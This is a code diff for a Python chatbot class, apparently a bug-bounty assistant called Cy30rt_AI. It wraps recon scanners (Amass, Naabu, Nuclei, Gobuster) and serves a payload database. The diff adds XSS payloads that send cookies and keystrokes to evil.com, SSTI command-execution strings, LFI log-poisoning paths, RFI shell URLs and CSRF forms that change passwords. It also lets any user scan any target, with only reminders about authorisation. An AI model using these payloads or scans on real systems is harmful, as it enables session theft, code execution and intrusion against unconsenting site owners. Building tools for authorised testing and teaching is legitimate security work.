@@ -14,13 +14,10 @@ class Cy30rtAI:
     
     def __init__(self):
         self.groq_client = AsyncGroq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
-        self.session_contexts = {}  # Store conversation context per session
         
         self.system_prompt = """You are Cy30rt_AI, a professional cybersecurity and bug bounty assistant created by Abdulbasid Yakubu (cy30rt).
 
 CAPABILITIES:
-- Remember previous conversations and provide contextual responses
-- Support multiple languages including English, Hausa, Arabic, and 12+ others
 - Run multiple reconnaissance tools (Amass, Subfinder, Assetfinder, Naabu, Nuclei, WhatWeb, Gobuster)
 - Execute complete full recon workflows
 - Analyze aggregated findings from all tools
@@ -31,82 +28,8 @@ IMPORTANT RULES:
 - ALWAYS remind users to ONLY test authorized targets
 - NEVER encourage illegal hacking
 - Provide complete, detailed responses
-- Use natural language without markdown symbols
-- When speaking Hausa, use proper Hausa grammar and vocabulary
 - End responses with: "Stay secure. - Cy30rt_AI"""
 
-        # Hausa language system prompt
-        self.system_prompt_ha = """Kai Cy30rt_AI ne, mataimakin tsaro na kwamfuta kuma farautar bug bounty wanda Abdulbasid Yakubu (cy30rt) ya kirkiro.
-
-IKON DA KAKE DA SHI:
-- Ka tuna tattaunawar da ta gabata
-- Ka yi amfani da Hausa da kyau sosai
-- Ka gudanar da kayan aikin bincike (Amass, Subfinder, Naabu, Nuclei, WhatWeb, Gobuster)
-- Ka samar da payloads
-- Ka bincika CVEs
-- Ka koyar da tsaro
-
-DOKOKI:
-- KA tuna kawai ka gwada kan abubuwan da aka ba ka izini
-- KA taimaka wajen koyo kawai
-- KA ba da cikakkun bayanai
-- KA kammala da: "Zauna lafiya. - Cy30rt_AI"""
-
-    # ============ CONVERSATION MEMORY ============
-    
-    def get_session_context(self, session_id: str) -> List[Dict]:
-        """Retrieve conversation context for a session"""
-        if session_id not in self.session_contexts:
-            self.session_contexts[session_id] = []
-        return self.session_contexts[session_id]
-    
-    def add_to_context(self, session_id: str, role: str, content: str):
-        """Add message to conversation context"""
-        if session_id not in self.session_contexts:
-            self.session_contexts[session_id] = []
-        self.session_contexts[session_id].append({"role": role, "content": content})
-        
-        # Keep only last 20 messages for context
-        if len(self.session_contexts[session_id]) > 20:
-            self.session_contexts[session_id] = self.session_contexts[session_id][-20:]
-    
-    def clear_session_context(self, session_id: str):
-        """Clear conversation context for a session"""
-        if session_id in self.session_contexts:
-            del self.session_contexts[session_id]
-    
-    # ============ HAUSA LANGUAGE SUPPORT (Aya API) ============
-    
-    async def chat_in_hausa(self, message: str, context: List[Dict] = None) -> AsyncGenerator[str, None]:
-        """Handle Hausa language queries using Aya model"""
-        try:
-            # Build messages with context
-            messages = [{"role": "system", "content": self.system_prompt_ha}]
-            
-            # Add conversation context if available
-            if context:
-                for ctx in context[-5:]:  # Last 5 messages for context
-                    messages.append({"role": ctx.get("role", "user"), "content": ctx.get("content", "")})
-            
-            messages.append({"role": "user", "content": message})
-            
-            # Use Groq with Llama model for Hausa (supports multiple languages)
-            stream = await self.groq_client.chat.completions.create(
-                model="llama-3.1-8b-instant",
-                messages=messages,
-                temperature=0.7,
-                max_tokens=1500,
-                stream=True
-            )
-            
-            async for chunk in stream:
-                if chunk.choices[0].delta.content:
-                    yield chunk.choices[0].delta.content
-                    
-        except Exception as e:
-            # Fallback response in Hausa
-            yield f"Yi hakuri, na sami matsala. Ka sake gwadawa daga baya. - Cy30rt_AI\n\nError: {str(e)}"
-    
     # ============ MULTI-TOOL RECONNAISSANCE INTEGRATION ============
     
     async def run_tool(self, tool_name: str, args: List[str], timeout: int = 120) -> str:
@@ -206,6 +129,51 @@ DOKOKI:
         
         return technologies
     
+    async def scan_vulnerabilities(self, target: str) -> List[Dict]:
+        """Run Nuclei vulnerability scanning"""
+        vulnerabilities = []
+        
+        nuclei_result = await self.run_tool("nuclei", [
+            "-u", target,
+            "-severity", "critical,high,medium",
+            "-silent",
+            "-json"
+        ], timeout=180)
+        
+        for line in nuclei_result.split('\n'):
+            if line.strip():
+                try:
+                    data = json.loads(line)
+                    vulnerabilities.append({
+                        "name": data.get("info", {}).get("name", "Unknown"),
+                        "severity": data.get("info", {}).get("severity", "info"),
+                        "url": data.get("host", ""),
+                        "matched_at": data.get("matched-at", ""),
+                        "source": "nuclei"
+                    })
+                except:
+                    pass
+        
+        return vulnerabilities
+    
+    async def run_directory_bruteforce(self, target: str) -> List[str]:
+        """Run Gobuster for directory enumeration"""
+        directories = []
+        
+        gobuster_result = await self.run_tool("gobuster", [
+            "dir", "-u", target, 
+            "-w", "/usr/share/wordlists/dirb/common.txt", 
+            "-q", "-s", "200,301,302,403"
+        ], timeout=120)
+        
+        for line in gobuster_result.split('\n'):
+            if any(code in line for code in ['200', '301', '302', '403']):
+                parts = line.split()
+                if len(parts) >= 2:
+                    directories.append(parts[1])
+        
+        return directories
+    
     async def run_full_recon(self, target: str) -> Dict[str, Any]:
         """Complete reconnaissance pipeline with all tools"""
         
@@ -218,11 +186,48 @@ DOKOKI:
             "directories": []
         }
         
+        # Phase 1: Subdomain Discovery (Parallel)
         results["subdomains"] = await self.discover_subdomains(target)
+        
+        # Phase 2: Port Scanning
         results["ports"] = await self.scan_ports(target)
+        
+        # Phase 3: Technology Detection
         results["technologies"] = await self.detect_technologies(target)
         
+        # Phase 4: Vulnerability Scanning
+        results["vulnerabilities"] = await self.scan_vulnerabilities(target)
+        
+        # Phase 5: Directory Bruteforce
+        results["directories"] = await self.run_directory_bruteforce(target)
+        
         return results
+    
+    # ============ INDIVIDUAL TOOL COMMANDS ============
+    
+    async def cmd_amass(self, target: str) -> str:
+        output = await self.run_tool("amass", ["enum", "-d", target])
+        return f"🔍 **Amass Subdomain Enumeration - {target}**\n\n```\n{output[:2000]}\n```"
+    
+    async def cmd_subfinder(self, target: str) -> str:
+        output = await self.run_tool("subfinder", ["-d", target, "-silent"])
+        return f"🔍 **Subfinder Results - {target}**\n\n```\n{output[:1500]}\n```"
+    
+    async def cmd_naabu(self, target: str) -> str:
+        output = await self.run_tool("naabu", ["-host", target, "-silent"])
+        return f"🔌 **Open Ports - {target}**\n\n```\n{output[:1000]}\n```"
+    
+    async def cmd_whatweb(self, target: str) -> str:
+        output = await self.run_tool("whatweb", [target])
+        return f"🌐 **Technology Detection - {target}**\n\n```\n{output[:1500]}\n```"
+    
+    async def cmd_nuclei(self, target: str) -> str:
+        output = await self.run_tool("nuclei", ["-u", target, "-severity", "critical,high,medium", "-silent"])
+        return f"⚠️ **Nuclei Vulnerability Scan - {target}**\n\n```\n{output[:2000]}\n```"
+    
+    async def cmd_gobuster(self, target: str) -> str:
+        output = await self.run_tool("gobuster", ["dir", "-u", target, "-w", "/usr/share/wordlists/dirb/common.txt", "-q"])
+        return f"📁 **Directory Bruteforce - {target}**\n\n```\n{output[:1500]}\n```"
     
     # ============ PAYLOAD DATABASE ============
     
@@ -260,7 +265,10 @@ admin' --
 <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
 
 **Keylogger:**
-<script>document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}</script>""",
+<script>document.onkeypress=function(e){fetch('https://evil.com/log?k='+e.key)}</script>
+
+**Blind XSS:**
+<script>document.location='https://evil.com/xss?c='+document.cookie</script>""",
             
             "ssti": """🧠 **SSTI Payloads**
 
@@ -271,7 +279,15 @@ admin' --
 
 **Twig (PHP):**
 {{_self.env.registerUndefinedFilterCallback("exec")}}
-{{_self.env.getFilter("id")}}""",
+{{_self.env.getFilter("id")}}
+
+**Freemarker (Java):**
+${7*7}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+**Smarty (PHP):**
+{$smarty.version}
+{php}echo system('id');{/php}""",
             
             "lfi": """📂 **LFI/RFI Payloads**
 
@@ -282,16 +298,37 @@ admin' --
 
 **PHP Wrappers:**
 php://filter/convert.base64-encode/resource=index.php
-php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
+php://filter/zlib.deflate/convert.base64-encode/resource=config.php
+php://input
+
+**Log Poisoning:**
+../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
+../../../../var/log/auth.log
+
+**RFI:**
+http://evil.com/shell.txt
+http://evil.com/shell.txt?cmd=id""",
             
             "csrf": """🔄 **CSRF PoC Generator**
 
+**GET Request CSRF:**
 <img src="https://target.com/change-email?email=hacker@evil.com">
 
+**POST Request CSRF:**
 <form action="https://target.com/change-password" method="POST">
   <input type="hidden" name="password" value="hacked123">
 </form>
-<script>document.forms[0].submit();</script>"""
+<script>document.forms[0].submit();</script>
+
+**JSON CSRF:**
+<script>
+fetch('https://target.com/api/update', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({email: 'hacker@evil.com'})
+});
+</script>"""
         }
         
         return payloads.get(vuln_type, f"Payload type '{vuln_type}' not found. Available: sqli, xss, ssti, lfi, csrf")
@@ -313,35 +350,133 @@ php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
 **Published:** {data.get('Published', 'N/A')}
 **Modified:** {data.get('Modified', 'N/A')}
 
+**References:**
+{chr(10).join([f"  • {ref[:80]}" for ref in data.get('references', [])[:5]])}
+
 **Remediation:** Check vendor advisory for patches."""
                 else:
                     return f"CVE {cve_id} not found. Check the ID format (e.g., CVE-2024-6387)"
         except Exception as e:
             return f"Error looking up CVE: {str(e)}"
     
+    # ============ TEACHING MODULES ============
+    
+    async def teach_topic(self, topic: str) -> str:
+        lessons = {
+            "sqli": """📚 **SQL Injection Lesson**
+
+**What is SQL Injection?**
+SQL injection occurs when user input is inserted directly into SQL queries without sanitization.
+
+**How it works:**
+Normal query: SELECT * FROM users WHERE username='admin' AND password='pass'
+Malicious input: admin' --
+Result: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
+
+**Types of SQLi:**
+1. In-band SQLi (Error-based, Union-based)
+2. Blind SQLi (Boolean-based, Time-based)
+3. Out-of-band SQLi
+
+**Test payloads:** /payload sqli
+
+**Practice:** Use /recon to find targets (with permission!)""",
+            
+            "xss": """📚 **XSS Lesson**
+
+**What is Cross-Site Scripting?**
+Injecting malicious JavaScript into web pages.
+
+**Types:**
+1. Reflected XSS - Input reflected immediately
+2. Stored XSS - Saved in database
+3. DOM-based XSS - Client-side JavaScript
+
+**Test payloads:** /payload xss
+
+**Impact:**
+• Cookie theft
+• Session hijacking
+• Keylogging
+• Defacement""",
+            
+            "recon": """📚 **Reconnaissance Methodology**
+
+**Phase 1 - Passive Recon:**
+• /amass target.com - Subdomain enumeration
+• /subfinder target.com - Passive subdomain discovery
+
+**Phase 2 - Active Recon:**
+• /naabu target.com - Port scanning
+• /whatweb target.com - Technology detection
+
+**Phase 3 - Vulnerability Scanning:**
+• /nuclei target.com - CVE and misconfiguration scanning
+• /gobuster target.com - Directory brute force
+
+**Phase 4 - Full Workflow:**
+• /fullrecon target.com - Run everything automatically"""
+        }
+        
+        return lessons.get(topic, f"Topic '{topic}' not found. Available: sqli, xss, recon")
+    
+    # ============ RESULT FORMATTER ============
+    
+    def format_recon_results(self, results: Dict) -> str:
+        """Format results for Telegram/Mini App display"""
+        report = f"✅ **FULL RECON COMPLETE - {results['target']}**\n\n"
+        report += f"📊 **Summary**\n"
+        report += f"• Subdomains found: {len(results['subdomains'])}\n"
+        report += f"• Open ports: {len(results['ports'])}\n"
+        report += f"• Technologies: {len(results['technologies'])}\n"
+        report += f"• Vulnerabilities: {len(results['vulnerabilities'])}\n"
+        report += f"• Directories: {len(results['directories'])}\n\n"
+        
+        if results['subdomains']:
+            report += f"🔹 **Subdomains (first 20):**\n"
+            for sub in results['subdomains'][:20]:
+                report += f"  • {sub}\n"
+            report += f"\n"
+        
+        if results['technologies']:
+            report += f"🔹 **Technologies Detected:**\n"
+            for tech in results['technologies'][:10]:
+                report += f"  • {tech.get('name', 'Unknown')}\n"
+            report += f"\n"
+        
+        if results['vulnerabilities']:
+            report += f"⚠️ **Vulnerabilities Found:**\n"
+            for vuln in results['vulnerabilities'][:10]:
+                report += f"  • [{vuln.get('severity', 'info').upper()}] {vuln.get('name', 'Unknown')[:60]}\n"
+            report += f"\n"
+        
+        if results['directories']:
+            report += f"📁 **Interesting Directories:**\n"
+            for d in results['directories'][:10]:
+                report += f"  • {d}\n"
+            report += f"\n"
+        
+        report += f"💡 **Next Steps:**\n"
+        report += f"• /payload sqli - Get SQL injection payloads\n"
+        report += f"• /nuclei {results['target']} - Detailed vulnerability scan\n"
+        report += f"• Ask me to analyze specific findings\n\n"
+        report += f"⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
+        
+        return report
+    
     # ============ MAIN CHAT ROUTER ============
     
-    async def chat(self, message: str, language: str = "en", context: List[Dict] = None, session_id: str = None) -> AsyncGenerator[str, None]:
-        """Main chat endpoint - routes to appropriate function with context memory"""
+    async def chat(self, message: str, language: str = "en") -> AsyncGenerator[str, None]:
+        """Main chat endpoint - routes to appropriate function"""
         
         msg_lower = message.lower().strip()
-        
-        # Store message in session context
-        if session_id:
-            self.add_to_context(session_id, "user", message)
-        
-        # ============ HAUSA LANGUAGE HANDLING ============
-        if language == "ha":
-            async for chunk in self.chat_in_hausa(message, context):
-                yield chunk
-            return
         
         # ============ MULTI-TOOL RECON COMMANDS ============
         
         if msg_lower.startswith("/fullrecon"):
             target = msg_lower.replace("/fullrecon", "").strip()
             if target:
-                yield f"🔍 Starting FULL reconnaissance on {target}\n\nRunning: Amass, Subfinder, Naabu, WhatWeb\n\n⏳ This will take 2-3 minutes...\n\nStay secure. - Cy30rt_AI"
+                yield f"🔍 **Starting FULL reconnaissance on {target}**\n\nRunning: Amass, Subfinder, Assetfinder, Naabu, WhatWeb, Nuclei, Gobuster\n\n⏳ This will take 3-5 minutes...\n📊 Results will appear here automatically.\n\nStay secure. - Cy30rt_AI"
                 
                 try:
                     results = await self.run_full_recon(target)
@@ -349,29 +484,93 @@ php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
                     for line in formatted.split('\n'):
                         yield line + '\n'
                 except Exception as e:
-                    yield f"Error: {str(e)}\n\nTry using /recon {target} for a faster scan."
+                    yield f"❌ Error: {str(e)}\n\nTry using /recon {target} for a faster scan."
                 return
             else:
-                yield "Usage: /fullrecon <target>\n\nExample: /fullrecon scanme.nmap.org"
+                yield "📋 **Usage:** /fullrecon <target>\n\nExample: /fullrecon scanme.nmap.org"
                 return
+        
+        if msg_lower.startswith("/amass"):
+            target = msg_lower.replace("/amass", "").strip()
+            if target:
+                result = await self.cmd_amass(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /amass <target>\n\nExample: /amass scanme.nmap.org"
+                return
+        
+        if msg_lower.startswith("/subfinder"):
+            target = msg_lower.replace("/subfinder", "").strip()
+            if target:
+                result = await self.cmd_subfinder(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /subfinder <target>\n\nExample: /subfinder scanme.nmap.org"
+                return
+        
+        if msg_lower.startswith("/naabu") or msg_lower.startswith("/portscan"):
+            target = msg_lower.replace("/naabu", "").replace("/portscan", "").strip()
+            if target:
+                result = await self.cmd_naabu(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /naabu <target>\n\nExample: /naabu scanme.nmap.org"
+                return
+        
+        if msg_lower.startswith("/whatweb"):
+            target = msg_lower.replace("/whatweb", "").strip()
+            if target:
+                result = await self.cmd_whatweb(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /whatweb <target>\n\nExample: /whatweb scanme.nmap.org"
+                return
+        
+        if msg_lower.startswith("/nuclei"):
+            target = msg_lower.replace("/nuclei", "").strip()
+            if target:
+                yield f"🔍 **Starting Nuclei vulnerability scan on {target}**\n\n⏳ This will take 1-2 minutes...\n\nStay secure. - Cy30rt_AI"
+                result = await self.cmd_nuclei(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /nuclei <target>\n\nExample: /nuclei scanme.nmap.org"
+                return
+        
+        if msg_lower.startswith("/gobuster"):
+            target = msg_lower.replace("/gobuster", "").strip()
+            if target:
+                yield f"🔍 **Starting directory brute force on {target}**\n\n⏳ Searching for hidden directories...\n\nStay secure. - Cy30rt_AI"
+                result = await self.cmd_gobuster(target)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /gobuster <target>\n\nExample: /gobuster https://scanme.nmap.org"
+                return
+        
+        # ============ RECONIX (Original) ============
         
         if msg_lower.startswith("/recon"):
             target = msg_lower.replace("/recon", "").strip()
             if target:
-                yield f"🔍 Starting reconnaissance on {target}\n\n⏳ This will take 1-2 minutes...\n\nStay secure. - Cy30rt_AI"
+                yield f"🔍 **Starting reconnaissance on {target}**\n\n⏳ This will take 1-2 minutes...\n📊 Results will appear here automatically.\n\nStay secure. - Cy30rt_AI"
                 
                 try:
                     cmd = ["reconix", target, "--deep", "--threads=10"]
                     result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                     output = result.stdout + result.stderr
                     
-                    results = f"✅ Recon Complete - {target}\n\n```\n{output[:3500]}\n```\n\n⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
+                    results = f"✅ **Recon Complete - {target}**\n\n```\n{output[:3500]}\n```\n\n⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
                     yield results
                 except Exception as e:
-                    yield f"Error: {str(e)}\n\nPlease ensure Reconix is installed."
+                    yield f"❌ Error: {str(e)}\n\nPlease ensure Reconix is installed."
                 return
             else:
-                yield "Usage: /recon <target>\n\nExample: /recon scanme.nmap.org"
+                yield "📋 **Usage:** /recon <target>\n\nExample: /recon scanme.nmap.org"
                 return
         
         # ============ PAYLOAD COMMANDS ============
@@ -383,7 +582,7 @@ php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
                 yield result
                 return
             else:
-                yield "Usage: /payload <type>\n\nAvailable: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli"
+                yield "📋 **Usage:** /payload <type>\n\nAvailable: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli"
                 return
         
         # ============ CVE COMMANDS ============
@@ -397,100 +596,110 @@ php://filter/zlib.deflate/convert.base64-encode/resource=config.php""",
                 yield result
                 return
             else:
-                yield "Usage: /cve CVE-YYYY-XXXX\n\nExample: /cve CVE-2024-6387"
+                yield "📋 **Usage:** /cve CVE-YYYY-XXXX\n\nExample: /cve CVE-2024-6387"
+                return
+        
+        # ============ LEARNING COMMANDS ============
+        
+        if msg_lower.startswith("/learn"):
+            topic = msg_lower.replace("/learn", "").strip()
+            if topic:
+                result = await self.teach_topic(topic)
+                yield result
+                return
+            else:
+                yield "📋 **Usage:** /learn <topic>\n\nAvailable: sqli, xss, recon\n\nExample: /learn sqli"
                 return
         
         # ============ HELP COMMAND ============
         
-        if msg_lower in ["/help", "/commands", "/start"]:
-            help_text = """🤖 **Cy30rt_AI Commands**
+        if msg_lower in ["/help", "/commands"]:
+            help_text = """🤖 **Cy30rt_AI Complete Commands**
 
-🔍 RECONNAISSANCE:
-/recon <target> - Fast reconnaissance scan
-/fullrecon <target> - Complete recon with all tools
+🔍 **MULTI-TOOL RECONNAISSANCE:**
+/fullrecon <target> - Complete workflow (Amass+Subfinder+Naabu+WhatWeb+Nuclei+Gobuster)
+/amass <target> - Subdomain enumeration
+/subfinder <target> - Passive subdomain discovery
+/naabu <target> - Port scanning
+/whatweb <target> - Technology detection
+/nuclei <target> - Vulnerability scanning
+/gobuster <target> - Directory brute force
+/recon <target> - Fast Reconix scan
 
-💉 PAYLOADS:
+💉 **PAYLOADS:**
 /payload sqli - SQL injection payloads
-/payload xss - XSS payloads  
+/payload xss - XSS payloads
 /payload ssti - SSTI payloads
 /payload lfi - LFI/RFI payloads
+/payload csrf - CSRF examples
 
-📋 INTELLIGENCE:
+📋 **INTELLIGENCE:**
 /cve <id> - Look up CVE information
 
-💬 GENERAL:
+📚 **LEARNING:**
+/learn sqli - SQL injection tutorial
+/learn xss - XSS tutorial
+/learn recon - Recon methodology
+
+💬 **GENERAL:**
 /help - Show this help
+/who - About the creator
 
 ⚠️ Always test only on authorized targets!
-
-💡 The AI remembers previous messages - ask follow-up questions!
 
 Stay secure. - Cy30rt_AI"""
             yield help_text
             return
         
-        # ============ GENERAL AI QUESTIONS WITH CONTEXT ============
+        if msg_lower in ["/who", "/creator", "/about"]:
+            who_text = """🤖 **Cy30rt_AI**
+
+I am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional.
+
+**Multi-Tool Capabilities:**
+• Amass, Subfinder, Assetfinder - Subdomain discovery
+• Naabu - Port scanning
+• WhatWeb - Technology fingerprinting
+• Nuclei - Vulnerability scanning (9,000+ templates)
+• Gobuster - Directory brute force
+• Reconix - All-in-one reconnaissance
+
+**Other Features:**
+• Generate attack payloads (SQLi, XSS, SSTI, LFI, CSRF)
+• Look up CVE information
+• Teach cybersecurity concepts
+• 15 languages support
+• Voice interaction
+
+⚠️ Always practice on authorized systems only!
+
+Stay secure. - Cy30rt_AI"""
+            yield who_text
+            return
+        
+        # ============ GENERAL AI QUESTIONS ============
         
         if self.groq_client:
             try:
-                # Build messages with context
-                messages = [{"role": "system", "content": self.system_prompt}]
-                
-                # Add conversation context if available
-                if context and len(context) > 0:
-                    for ctx in context[-5:]:  # Last 5 messages for context
-                        messages.append({"role": ctx.get("role", "user"), "content": ctx.get("content", "")})
-                
-                messages.append({"role": "user", "content": message})
-                
                 stream = await self.groq_client.chat.completions.create(
                     model="llama-3.1-8b-instant",
-                    messages=messages,
+                    messages=[
+                        {"role": "system", "content": self.system_prompt},
+                        {"role": "user", "content": message}
+                    ],
                     temperature=0.7,
                     max_tokens=1500,
                     stream=True
                 )
                 
-                full_response = ""
                 async for chunk in stream:
                     if chunk.choices[0].delta.content:
-                        content = chunk.choices[0].delta.content
-                        full_response += content
-                        yield content
-                
-                # Store response in session context
-                if session_id:
-                    self.add_to_context(session_id, "assistant", full_response)
-                
+                        yield chunk.choices[0].delta.content
                 return
             except Exception as e:
-                yield f"I am Cy30rt_AI, your cybersecurity assistant created by Abdulbasid Yakubu (cy30rt). How can I help you?\n\nError: {str(e)}"
+                yield f"Error: {str(e)}"
         else:
-            yield "I am Cy30rt_AI, your cybersecurity assistant. Type /help to see available commands!"
-    
-    def format_recon_results(self, results: Dict) -> str:
-        """Format results for display"""
-        report = f"✅ FULL RECON COMPLETE - {results['target']}\n\n"
-        report += f"📊 Summary\n"
-        report += f"• Subdomains found: {len(results['subdomains'])}\n"
-        report += f"• Open ports: {len(results['ports'])}\n"
-        report += f"• Technologies: {len(results['technologies'])}\n\n"
-        
-        if results['subdomains']:
-            report += f"🔹 Subdomains (first 15):\n"
-            for sub in results['subdomains'][:15]:
-                report += f"  • {sub}\n"
-            report += f"\n"
-        
-        if results['technologies']:
-            report += f"🔹 Technologies Detected:\n"
-            for tech in results['technologies'][:10]:
-                report += f"  • {tech.get('name', 'Unknown')}\n"
-            report += f"\n"
-        
-        report += f"⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI"
-        
-        return report
+            yield "I'm Cy30rt_AI, your cybersecurity assistant. Type /help to see available commands!"
 
 # Singleton instance
 cy30rt_ai = Cy30rtAI()
